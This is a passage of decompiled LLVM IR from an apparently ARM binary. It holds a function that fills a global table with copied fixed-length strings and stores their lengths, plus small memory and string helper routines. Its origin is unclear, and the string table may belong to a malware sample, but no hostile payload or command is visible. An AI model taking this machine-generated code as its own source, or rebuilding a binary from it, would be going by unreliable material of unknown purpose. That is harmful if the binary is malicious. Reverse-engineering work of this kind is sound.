  store i32 %v0_1048c, i32* @r5, align 4
  %v4_1049c = call i32 @function_108bc(i32 %v0_1048c, i32 ptrtoint ([4 x i8]* @global_var_1676c.230 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_21340.231 to i16*), align 4
  %v0_104ac = load i32, i32* @r5, align 4
  store i32 %v0_104ac, i32* @global_var_2133c.232, align 4
  %v0_104b0 = call i32 @function_11d34()
  store i32 %v0_104b0, i32* @r5, align 4
  %v3_104c0 = call i32 @function_108bc(i32 %v0_104b0, i32 ptrtoint (i32* @global_var_16770.234 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_21348.235 to i16*), align 4
  %v0_104d0 = load i32, i32* @r5, align 4
  store i32 %v0_104d0, i32* @global_var_21344.236, align 4
  %v0_104d4 = call i32 @function_11d34()
  store i32 %v0_104d4, i32* @r5, align 4
  %v3_104e4 = call i32 @function_108bc(i32 %v0_104d4, i32 ptrtoint (i32* @global_var_16784.238 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_21350.239 to i16*), align 4
  %v0_104f4 = load i32, i32* @r5, align 4
  store i32 %v0_104f4, i32* @global_var_2134c.240, align 4
  %v0_104f8 = call i32 @function_11d34()
  store i32 %v0_104f8, i32* @r5, align 4
  %v4_10508 = call i32 @function_108bc(i32 %v0_104f8, i32 ptrtoint ([10 x i8]* @global_var_167a0.242 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_21358.243 to i16*), align 4
  %v0_10518 = load i32, i32* @r5, align 4
  store i32 %v0_10518, i32* @global_var_21354.244, align 4
  %v0_1051c = call i32 @function_11d34()
  store i32 %v0_1051c, i32* @r5, align 4
  store i32 16, i32* @sl, align 4
  %v4_10530 = call i32 @function_108bc(i32 %v0_1051c, i32 ptrtoint ([17 x i8]* @global_var_167ac.246 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_10538 = load i32, i32* @r5, align 4
  store i32 %v0_10538, i32* @global_var_2135c.247, align 4
  %v0_1053c = load i32, i32* @sl, align 4
  %v1_1053c = trunc i32 %v0_1053c to i16
  store i16 %v1_1053c, i16* bitcast (i32* @global_var_21360.248 to i16*), align 4
  %v0_10540 = call i32 @function_11d34()
  store i32 %v0_10540, i32* @r5, align 4
  %v4_10550 = call i32 @function_108bc(i32 %v0_10540, i32 ptrtoint ([23 x i8]* @global_var_167c0.250 to i32), i32 22)
  %v0_10558 = load i32, i32* @r7, align 4
  store i32 %v0_10558, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_21368.251 to i16*), align 4
  %v0_10560 = load i32, i32* @r5, align 4
  store i32 %v0_10560, i32* @global_var_21364.252, align 4
  %v0_10564 = call i32 @function_11d34()
  %v0_1056c = load i32, i32* @r7, align 4
  store i32 %v0_10564, i32* @r5, align 4
  %v4_10574 = call i32 @function_108bc(i32 %v0_10564, i32 ptrtoint ([8 x i8]* @global_var_167d8.254 to i32), i32 %v0_1056c)
  store i32 5, i32* @r0, align 4
  %v0_1057c = load i32, i32* @r5, align 4
  store i32 %v0_1057c, i32* @global_var_2136c.255, align 4
  %v0_10580 = load i32, i32* @r7, align 4
  %v1_10580 = trunc i32 %v0_10580 to i16
  store i16 %v1_10580, i16* bitcast (i32* @global_var_21370.256 to i16*), align 4
  %v0_10584 = call i32 @function_11d34()
  store i32 %v0_10584, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_10598 = call i32 @function_108bc(i32 %v0_10584, i32 ptrtoint ([6 x i8]* @global_var_167e0.258 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_105a0 = load i32, i32* @r5, align 4
  store i32 %v0_105a0, i32* @global_var_21374.259, align 4
  %v0_105a4 = load i32, i32* @fp, align 4
  %v1_105a4 = trunc i32 %v0_105a4 to i16
  store i16 %v1_105a4, i16* bitcast (i32* @global_var_21378.260 to i16*), align 4
  %v0_105a8 = call i32 @function_11d34()
  store i32 %v0_105a8, i32* @r5, align 4
  %v4_105b8 = call i32 @function_108bc(i32 %v0_105a8, i32 ptrtoint ([5 x i8]* @global_var_167e8.262 to i32), i32 4)
  %v0_105c0 = load i32, i32* @sb, align 4
  store i32 %v0_105c0, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_21380.263 to i16*), align 4
  %v0_105c8 = load i32, i32* @r5, align 4
  store i32 %v0_105c8, i32* @global_var_2137c.264, align 4
  %v0_105cc = call i32 @function_11d34()
  %v0_105d4 = load i32, i32* @sb, align 4
  store i32 %v0_105cc, i32* @r5, align 4
  %v4_105dc = call i32 @function_108bc(i32 %v0_105cc, i32 ptrtoint ([7 x i8]* @global_var_167f0.266 to i32), i32 %v0_105d4)
  store i32 14, i32* @r0, align 4
  %v0_105e4 = load i32, i32* @r5, align 4
  store i32 %v0_105e4, i32* @global_var_21384.267, align 4
  %v0_105e8 = load i32, i32* @sb, align 4
  %v1_105e8 = trunc i32 %v0_105e8 to i16
  store i16 %v1_105e8, i16* bitcast (i32* @global_var_21388.268 to i16*), align 4
  %v0_105ec = call i32 @function_11d34()
  store i32 %v0_105ec, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_10600 = call i32 @function_108bc(i32 %v0_105ec, i32 ptrtoint ([15 x i8]* @global_var_167f8.270 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_10608 = load i32, i32* @r5, align 4
  store i32 %v0_10608, i32* @global_var_2138c.271, align 4
  %v0_1060c = load i32, i32* @r8, align 4
  %v1_1060c = trunc i32 %v0_1060c to i16
  store i16 %v1_1060c, i16* bitcast (i32* @global_var_21390.272 to i16*), align 4
  %v0_10610 = call i32 @function_11d34()
  store i32 8, i32* @r6, align 4
  store i32 %v0_10610, i32* @r5, align 4
  %v4_10624 = call i32 @function_108bc(i32 %v0_10610, i32 ptrtoint ([9 x i8]* @global_var_16808.274 to i32), i32 8)
  %v0_10628 = load i32, i32* @r7, align 4
  store i32 %v0_10628, i32* @r0, align 4
  %v0_1062c = load i32, i32* @r5, align 4
  store i32 %v0_1062c, i32* @global_var_213ec.275, align 4
  %v0_10630 = load i32, i32* @r6, align 4
  %v1_10630 = trunc i32 %v0_10630 to i16
  store i16 %v1_10630, i16* bitcast (i32* @global_var_213f0.276 to i16*), align 4
  %v0_10634 = call i32 @function_11d34()
  %v0_1063c = load i32, i32* @r7, align 4
  store i32 %v0_10634, i32* @r5, align 4
  %v4_10644 = call i32 @function_108bc(i32 %v0_10634, i32 ptrtoint ([8 x i8]* @global_var_16814.278 to i32), i32 %v0_1063c)
  %v0_10648 = load i32, i32* @sl, align 4
  store i32 %v0_10648, i32* @r0, align 4
  %v0_1064c = load i32, i32* @r5, align 4
  store i32 %v0_1064c, i32* @global_var_213f4.279, align 4
  %v0_10650 = load i32, i32* @r7, align 4
  %v1_10650 = trunc i32 %v0_10650 to i16
  store i16 %v1_10650, i16* bitcast (i32* @global_var_213f8.280 to i16*), align 4
  %v0_10654 = call i32 @function_11d34()
  %v0_1065c = load i32, i32* @sl, align 4
  store i32 %v0_10654, i32* @r5, align 4
  %v4_10664 = call i32 @function_108bc(i32 %v0_10654, i32 ptrtoint ([17 x i8]* @global_var_1681c.282 to i32), i32 %v0_1065c)
  %v0_10668 = load i32, i32* @r6, align 4
  store i32 %v0_10668, i32* @r0, align 4
  %v0_1066c = load i32, i32* @r5, align 4
  store i32 %v0_1066c, i32* @global_var_21394.283, align 4
  %v0_10670 = load i32, i32* @sl, align 4
  %v1_10670 = trunc i32 %v0_10670 to i16
  store i16 %v1_10670, i16* bitcast (i32* @global_var_21398.284 to i16*), align 4
  %v0_10674 = call i32 @function_11d34()
  %v0_1067c = load i32, i32* @r6, align 4
  store i32 %v0_10674, i32* @r5, align 4
  %v4_10684 = call i32 @function_108bc(i32 %v0_10674, i32 ptrtoint ([9 x i8]* @global_var_16830.286 to i32), i32 %v0_1067c)
  store i32 21, i32* @r0, align 4
  %v0_1068c = load i32, i32* @r5, align 4
  store i32 %v0_1068c, i32* @global_var_2139c.287, align 4
  %v0_10690 = load i32, i32* @r6, align 4
  %v1_10690 = trunc i32 %v0_10690 to i16
  store i16 %v1_10690, i16* bitcast (i32* @global_var_213a0.288 to i16*), align 4
  %v0_10694 = call i32 @function_11d34()
  store i32 %v0_10694, i32* @r5, align 4
  %v3_106a4 = call i32 @function_108bc(i32 %v0_10694, i32 ptrtoint (i32* @global_var_168d8.290 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_213a8.291 to i16*), align 4
  %v0_106b4 = load i32, i32* @r5, align 4
  store i32 %v0_106b4, i32* @global_var_213a4.292, align 4
  %v0_106b8 = call i32 @function_11d34()
  store i32 %v0_106b8, i32* @r5, align 4
  %v4_106c8 = call i32 @function_108bc(i32 %v0_106b8, i32 ptrtoint ([18 x i8]* @global_var_1683c.294 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_213b0.295 to i16*), align 4
  %v0_106d8 = load i32, i32* @r5, align 4
  store i32 %v0_106d8, i32* @global_var_213ac.296, align 4
  %v0_106dc = call i32 @function_11d34()
  store i32 %v0_106dc, i32* @r5, align 4
  %v4_106ec = call i32 @function_108bc(i32 %v0_106dc, i32 ptrtoint ([13 x i8]* @global_var_16850.298 to i32), i32 12)
  %v0_106f4 = load i32, i32* @r8, align 4
  store i32 %v0_106f4, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_213b8.299 to i16*), align 4
  %v0_106fc = load i32, i32* @r5, align 4
  store i32 %v0_106fc, i32* @global_var_213b4.300, align 4
  %v0_10700 = call i32 @function_11d34()
  %v0_10708 = load i32, i32* @r8, align 4
  store i32 %v0_10700, i32* @r5, align 4
  %v4_10710 = call i32 @function_108bc(i32 %v0_10700, i32 ptrtoint ([15 x i8]* @global_var_16860.302 to i32), i32 %v0_10708)
  store i32 19, i32* @r0, align 4
  %v0_10718 = load i32, i32* @r5, align 4
  store i32 %v0_10718, i32* @global_var_213bc.303, align 4
  %v0_1071c = load i32, i32* @r8, align 4
  %v1_1071c = trunc i32 %v0_1071c to i16
  store i16 %v1_1071c, i16* bitcast (i32* @global_var_213c0.304 to i16*), align 4
  %v0_10720 = call i32 @function_11d34()
  store i32 %v0_10720, i32* @r5, align 4
  %v4_10730 = call i32 @function_108bc(i32 %v0_10720, i32 ptrtoint ([20 x i8]* @global_var_16870.306 to i32), i32 19)
  %v0_10738 = load i32, i32* @r6, align 4
  store i32 %v0_10738, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_213c8.307 to i16*), align 4
  %v0_10740 = load i32, i32* @r5, align 4
  store i32 %v0_10740, i32* @global_var_213c4.308, align 4
  %v0_10744 = call i32 @function_11d34()
  %v0_1074c = load i32, i32* @r6, align 4
  store i32 %v0_10744, i32* @r5, align 4
  %v4_10754 = call i32 @function_108bc(i32 %v0_10744, i32 ptrtoint ([9 x i8]* @global_var_16884.310 to i32), i32 %v0_1074c)
  %v0_10758 = load i32, i32* @fp, align 4
  store i32 %v0_10758, i32* @r0, align 4
  %v0_1075c = load i32, i32* @r5, align 4
  store i32 %v0_1075c, i32* @global_var_213cc.311, align 4
  %v0_10760 = load i32, i32* @r6, align 4
  %v1_10760 = trunc i32 %v0_10760 to i16
  store i16 %v1_10760, i16* bitcast (i32* @global_var_213d0.312 to i16*), align 4
  %v0_10764 = call i32 @function_11d34()
  %v0_1076c = load i32, i32* @fp, align 4
  store i32 %v0_10764, i32* @r5, align 4
  %v4_10774 = call i32 @function_108bc(i32 %v0_10764, i32 ptrtoint ([6 x i8]* @global_var_16890.314 to i32), i32 %v0_1076c)
  %v0_10778 = load i32, i32* @sb, align 4
  store i32 %v0_10778, i32* @r0, align 4
  %v0_1077c = load i32, i32* @r5, align 4
  store i32 %v0_1077c, i32* @global_var_213d4.315, align 4
  %v0_10780 = load i32, i32* @fp, align 4
  %v1_10780 = trunc i32 %v0_10780 to i16
  store i16 %v1_10780, i16* bitcast (i32* @global_var_213d8.316 to i16*), align 4
  %v0_10784 = call i32 @function_11d34()
  %v0_1078c = load i32, i32* @sb, align 4
  store i32 %v0_10784, i32* @r5, align 4
  %v4_10794 = call i32 @function_108bc(i32 %v0_10784, i32 ptrtoint ([7 x i8]* @global_var_16898.318 to i32), i32 %v0_1078c)
  store i32 23, i32* @r0, align 4
  %v0_1079c = load i32, i32* @r5, align 4
  store i32 %v0_1079c, i32* @global_var_213dc.319, align 4
  %v0_107a0 = load i32, i32* @sb, align 4
  %v1_107a0 = trunc i32 %v0_107a0 to i16
  store i16 %v1_107a0, i16* bitcast (i32* @global_var_213e0.320 to i16*), align 4
  %v0_107a4 = call i32 @function_11d34()
  %v4_107b4 = call i32 @function_108bc(i32 %v0_107a4, i32 ptrtoint ([24 x i8]* @global_var_168a0.322 to i32), i32 23)
  store i32 %v0_107a4, i32* @global_var_213e4.323, align 4
  store i16 23, i16* bitcast (i32* @global_var_213e8.324 to i16*), align 4
  store i32 %v3_103ac, i32* @r4, align 4
  store i32 %v6_103ac, i32* @r5, align 4
  store i32 %v9_103ac, i32* @r6, align 4
  store i32 %v12_103ac, i32* @r7, align 4
  store i32 %v15_103ac, i32* @r8, align 4
  store i32 %v18_103ac, i32* @sb, align 4
  store i32 %v21_103ac, i32* @sl, align 4
  store i32 %v24_103ac, i32* @fp, align 4
  ret i32 %v4_107b4

; uselistorder directives
  uselistorder i32 %v0_10784, { 1, 0 }
  uselistorder i32 %v0_10764, { 1, 0 }
  uselistorder i32 %v0_10744, { 1, 0 }
  uselistorder i32 %v0_10700, { 1, 0 }
  uselistorder i32 %v0_10674, { 1, 0 }
  uselistorder i32 %v0_10654, { 1, 0 }
  uselistorder i32 %v0_10634, { 1, 0 }
  uselistorder i32 %v0_10610, { 1, 0 }
  uselistorder i32 %v0_105cc, { 1, 0 }
  uselistorder i32 %v0_10564, { 1, 0 }
  uselistorder i32 %v0_1046c, { 1, 0 }
  uselistorder i32 %v0_1044c, { 1, 0 }
  uselistorder i32 %v0_10424, { 1, 0 }
  uselistorder i32 %v0_103e0, { 1, 0 }
  uselistorder i32 %v0_103b8, { 1, 0 }
  uselistorder i32 23, { 0, 4, 1, 2, 3 }
  uselistorder i32 21, { 0, 5, 6, 4, 1, 7, 2, 8, 3, 9 }
  uselistorder i32 29, { 0, 3, 4, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_108bc, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_21304.199 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @function_1084c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1084c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10850 = load i8, i8* %arg1, align 1
  %v2_10854 = icmp eq i8 %v3_10850, 0
  %v0_10858 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10854, i32 %v0_10858)
  br label %dec_label_pc_10860

dec_label_pc_10860:                               ; preds = %dec_label_pc_10860, %dec_label_pc_1084c
  %v0_10860 = phi i32 [ %v1_10860, %dec_label_pc_10860 ], [ 0, %dec_label_pc_1084c ]
  %v1_10860 = add i32 %v0_10860, 1
  %v2_10864 = add i32 %v1_10860, %tmp
  %v3_10864 = inttoptr i32 %v2_10864 to i8*
  %v4_10864 = load i8, i8* %v3_10864, align 1
  %v2_10868 = icmp eq i8 %v4_10864, 0
  br i1 %v2_10868, label %dec_label_pc_10870, label %dec_label_pc_10860

dec_label_pc_10870:                               ; preds = %dec_label_pc_10860
  ret i32 %v1_10860
}

define i32 @function_10874(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10874:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_10874 = load i8, i8* %arg1, align 1
  %v3_10874 = zext i8 %v2_10874 to i32
  store i32 %v3_10874, i32* @r2, align 4
  %v2_10878 = icmp eq i8 %v2_10874, 0
  br i1 %v2_10878, label %bb, label %dec_label_pc_10884

bb:                                               ; preds = %dec_label_pc_10874
  store i32 %v3_10874, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10898

dec_label_pc_10884:                               ; preds = %dec_label_pc_10874
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10888

dec_label_pc_10888:                               ; preds = %dec_label_pc_10888, %dec_label_pc_10884
  %v0_10888 = phi i32 [ %v1_10888, %dec_label_pc_10888 ], [ 0, %dec_label_pc_10884 ]
  %v1_10888 = add i32 %v0_10888, 1
  store i32 %v1_10888, i32* %ip.global-to-local, align 4
  %v2_1088c = add i32 %v1_10888, %tmp
  %v3_1088c = inttoptr i32 %v2_1088c to i8*
  %v4_1088c = load i8, i8* %v3_1088c, align 1
  %v2_10890 = icmp eq i8 %v4_1088c, 0
  br i1 %v2_10890, label %dec_label_pc_10898, label %dec_label_pc_10888

dec_label_pc_10898:                               ; preds = %dec_label_pc_10888, %bb
  %v0_10898 = phi i32 [ %v3_10874, %bb ], [ %v1_10888, %dec_label_pc_10888 ]
  br label %dec_label_pc_108a4

dec_label_pc_108a0:                               ; preds = %dec_label_pc_108a4
  %v0_108a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_108a0 = add i32 %v0_108a0, 1
  %v2_108a0 = inttoptr i32 %v1_108a0 to i8*
  %v3_108a0 = load i8, i8* %v2_108a0, align 1
  %v4_108a0 = zext i8 %v3_108a0 to i32
  store i32 %v4_108a0, i32* @r2, align 4
  store i32 %v1_108a0, i32* %r1.global-to-local, align 4
  %v0_108a4.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_108a4

dec_label_pc_108a4:                               ; preds = %dec_label_pc_10898, %dec_label_pc_108a0
  %v0_108ac.off0 = phi i8 [ %v2_10874, %dec_label_pc_10898 ], [ %v3_108a0, %dec_label_pc_108a0 ]
  %v0_108a4 = phi i32 [ %v0_10898, %dec_label_pc_10898 ], [ %v0_108a4.pr, %dec_label_pc_108a0 ]
  %v1_108a4 = add i32 %v0_108a4, -1
  store i32 %v1_108a4, i32* @r3, align 4
  %v3_108a8 = icmp eq i32 %v0_108a4, 0
  %v2_108ac = load i32, i32* @r0, align 4
  %v3_108ac = inttoptr i32 %v2_108ac to i8*
  store i8 %v0_108ac.off0, i8* %v3_108ac, align 1
  %v4_108ac = load i32, i32* @r0, align 4
  %v5_108ac = add i32 %v4_108ac, 1
  store i32 %v5_108ac, i32* @r0, align 4
  br i1 %v3_108a8, label %dec_label_pc_108b4, label %dec_label_pc_108a0

dec_label_pc_108b4:                               ; preds = %dec_label_pc_108a4
  %v0_108b4 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_108b4

; uselistorder directives
  uselistorder i32 %v0_108a4, { 1, 0 }
  uselistorder i32 %v1_10888, { 0, 1, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_108a4, { 1, 0 }
}

define i32 @function_108bc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_108bc:
  %v2_108bc = icmp eq i32 %arg3, 0
  %v0_108c0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_108bc, i32 %v0_108c0)
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108c8, %dec_label_pc_108bc
  %v0_108c8 = phi i32 [ %v1_108d0, %dec_label_pc_108c8 ], [ 0, %dec_label_pc_108bc ]
  %v2_108c8 = add i32 %v0_108c8, %arg2
  %v3_108c8 = inttoptr i32 %v2_108c8 to i8*
  %v4_108c8 = load i8, i8* %v3_108c8, align 1
  %v4_108cc = add i32 %v0_108c8, %arg1
  %v5_108cc = inttoptr i32 %v4_108cc to i8*
  store i8 %v4_108c8, i8* %v5_108cc, align 1
  %v0_108d0 = load i32, i32* @ip, align 4
  %v1_108d0 = add i32 %v0_108d0, 1
  store i32 %v1_108d0, i32* @ip, align 4
  %v9_108d4 = icmp eq i32 %v1_108d0, %arg3
  br i1 %v9_108d4, label %dec_label_pc_108dc, label %dec_label_pc_108c8

dec_label_pc_108dc:                               ; preds = %dec_label_pc_108c8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_108d0, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_108e0() local_unnamed_addr {
dec_label_pc_108e0:
  %r2.global-to-local = alloca i32, align 4
  %v0_108e0 = load i32, i32* @r1, align 4
  %v2_108e0 = icmp eq i32 %v0_108e0, 0
  %v0_108e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_108e0, i32 %v0_108e4)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108ec, %dec_label_pc_108e0
  %v2_108f0 = phi i32 [ %v1_108f4, %dec_label_pc_108ec ], [ 0, %dec_label_pc_108e0 ]
  store i32 0, i32* @r3, align 4
  %v3_108f0 = load i32, i32* @r0, align 4
  %v4_108f0 = add i32 %v3_108f0, %v2_108f0
  %v5_108f0 = inttoptr i32 %v4_108f0 to i8*
  store i8 0, i8* %v5_108f0, align 1
  %v0_108f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_108f4 = add i32 %v0_108f4, 1
  store i32 %v1_108f4, i32* %r2.global-to-local, align 4
  %v1_108f8 = load i32, i32* @r1, align 4
  %v9_108f8 = icmp eq i32 %v1_108f4, %v1_108f8
  br i1 %v9_108f8, label %dec_label_pc_10900, label %dec_label_pc_108ec

dec_label_pc_10900:                               ; preds = %dec_label_pc_108ec
  %v1_10900 = load i32, i32* @r0, align 4
  ret i32 %v1_10900

; uselistorder directives
  uselistorder i32 %v1_108f4, { 1, 2, 0 }
}

define i32 @function_10904(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10904:
  %v7_10918 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_10918, label %dec_label_pc_10920, label %dec_label_pc_10928

dec_label_pc_10920:                               ; preds = %dec_label_pc_1093c, %dec_label_pc_10928, %dec_label_pc_10904, %dec_label_pc_10968
  %storemerge = phi i32 [ %v1_10968, %dec_label_pc_10968 ], [ -1, %dec_label_pc_10904 ], [ -1, %dec_label_pc_10928 ], [ -1, %dec_label_pc_1093c ]
  ret i32 %storemerge

dec_label_pc_10928:                               ; preds = %dec_label_pc_10904
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10920, label %dec_label_pc_10930

dec_label_pc_10930:                               ; preds = %dec_label_pc_10928
  br label %dec_label_pc_10948

dec_label_pc_1093c:                               ; preds = %bb, %dec_label_pc_1095c
  %v1_109483 = phi i32 [ %v1_1095c, %dec_label_pc_1095c ], [ 0, %bb ]
  %v1_1093c = add i32 %v0_10968, 1
  %v9_10940 = icmp eq i32 %v1_1093c, %arg2
  br i1 %v9_10940, label %dec_label_pc_10920, label %dec_label_pc_10948

dec_label_pc_10948:                               ; preds = %dec_label_pc_1093c, %dec_label_pc_10930
  %v0_10968 = phi i32 [ %v1_1093c, %dec_label_pc_1093c ], [ 0, %dec_label_pc_10930 ]
  %v1_10948 = phi i32 [ %v1_109483, %dec_label_pc_1093c ], [ 0, %dec_label_pc_10930 ]
  %v2_10948 = add i32 %v1_10948, %arg3
  %v3_10948 = inttoptr i32 %v2_10948 to i8*
  %v4_10948 = load i8, i8* %v3_10948, align 1
  %v2_1094c = add i32 %v0_10968, %arg1
  %v3_1094c = inttoptr i32 %v2_1094c to i8*
  %v4_1094c = load i8, i8* %v3_1094c, align 1
  %v9_10950 = icmp eq i8 %v4_1094c, %v4_10948
  br i1 %v9_10950, label %dec_label_pc_1095c, label %bb

bb:                                               ; preds = %dec_label_pc_10948
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1093c

dec_label_pc_1095c:                               ; preds = %dec_label_pc_10948
  %v1_1095c = add i32 %v1_10948, 1
  store i32 %v1_1095c, i32* @ip, align 4
  %v9_10960 = icmp eq i32 %v1_1095c, %arg4
  br i1 %v9_10960, label %dec_label_pc_10968, label %dec_label_pc_1093c

dec_label_pc_10968:                               ; preds = %dec_label_pc_1095c
  %v1_10968 = add i32 %v0_10968, 1
  br label %dec_label_pc_10920

; uselistorder directives
  uselistorder i32 %v1_1095c, { 1, 2, 0 }
  uselistorder i32 %v1_10948, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1093c, { 1, 0 }
  uselistorder label %dec_label_pc_10920, { 3, 0, 1, 2 }
}

define i32 @function_10970(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10970:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10970 = load i32, i32* @r4, align 4
  %v12_10970 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10980

dec_label_pc_10980:                               ; preds = %.thread, %dec_label_pc_10994, %bb, %dec_label_pc_10970
  %v0_10980 = phi i32 [ %tmp, %dec_label_pc_10970 ], [ %v5_10980, %bb ], [ %v5_10980, %dec_label_pc_10994 ], [ %v5_10980, %.thread ]
  %v1_10980 = inttoptr i32 %v0_10980 to i8*
  %v2_10980 = load i8, i8* %v1_10980, align 1
  %v5_10980 = add i32 %v0_10980, 1
  store i32 %v5_10980, i32* %r5.global-to-local, align 4
  %v7_10984 = icmp eq i8 %v2_10980, 9
  br i1 %v7_10984, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10980
  br label %dec_label_pc_10980

bb:                                               ; preds = %dec_label_pc_10980
  %v3_10980 = zext i8 %v2_10980 to i32
  %v8_10988 = icmp eq i8 %v2_10980, 32
  store i32 %v3_10980, i32* @r4, align 4
  br i1 %v8_10988, label %dec_label_pc_10980, label %dec_label_pc_10994

dec_label_pc_10994:                               ; preds = %bb
  %v7_10994 = icmp eq i8 %v2_10980, 10
  br i1 %v7_10994, label %dec_label_pc_10980, label %dec_label_pc_1099c

dec_label_pc_1099c:                               ; preds = %dec_label_pc_10994
  %v7_1099c = icmp eq i8 %v2_10980, 45
  br i1 %v7_1099c, label %dec_label_pc_10a8c, label %dec_label_pc_109a4

dec_label_pc_109a4:                               ; preds = %dec_label_pc_1099c
  %v7_109a4 = icmp eq i8 %v2_10980, 43
  br i1 %v7_109a4, label %bb44, label %dec_label_pc_109b4

bb44:                                             ; preds = %dec_label_pc_109a4
  %v2_109a8 = inttoptr i32 %v5_10980 to i8*
  %v3_109a8 = load i8, i8* %v2_109a8, align 1
  %v4_109a8 = zext i8 %v3_109a8 to i32
  store i32 %v4_109a8, i32* @r4, align 4
  %v6_109a8 = add i32 %v0_10980, 2
  store i32 %v6_109a8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_109b4

dec_label_pc_109b4:                               ; preds = %bb44, %dec_label_pc_109a4, %dec_label_pc_10a8c
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10a8c ], [ 2147483647, %dec_label_pc_109a4 ], [ 2147483647, %bb44 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10a8c ], [ 0, %dec_label_pc_109a4 ], [ 0, %bb44 ]
  store i32 %storemerge1, i32* @r7, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_109bc = call i32 @function_10ea4(i32 %storemerge1, i32 %arg2)
  %v0_109c0 = load i32, i32* @r7, align 4
  store i32 %v0_109c0, i32* @r0, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  %v0_109c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_109c8, i32* @r1, align 4
  %v0_109cc = call i32 @function_10da8()
  %v0_109dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_109dc.outer

dec_label_pc_109dc.outer:                         ; preds = %.thread5, %dec_label_pc_109b4
  %v2_10a58.ph = phi i32 [ %v5_10a58, %.thread5 ], [ 0, %dec_label_pc_109b4 ]
  %v1_10a1c.ph = phi i32 [ %v4_10a5c, %.thread5 ], [ %v0_109dc.pre, %dec_label_pc_109b4 ]
  %v1_10a34.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_109b4 ]
  %v3_10a28 = icmp uge i32 %v2_10a58.ph, %v0_109cc
  %v9_10a28 = icmp eq i32 %v2_10a58.ph, %v0_109cc
  %v2_10a2c = xor i1 %v3_10a28, true
  %v3_10a2c = or i1 %v9_10a28, %v2_10a2c
  %v2_10a30 = xor i1 %v9_10a28, true
  %v3_10a30 = and i1 %v3_10a28, %v2_10a30
  %v2_10a50 = icmp eq i1 %v9_10a28, false
  br label %dec_label_pc_109dc

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109dc.outer, %dec_label_pc_10a64
  %v1_10a34 = phi i32 [ -1, %dec_label_pc_10a64 ], [ %v1_10a34.ph, %dec_label_pc_109dc.outer ]
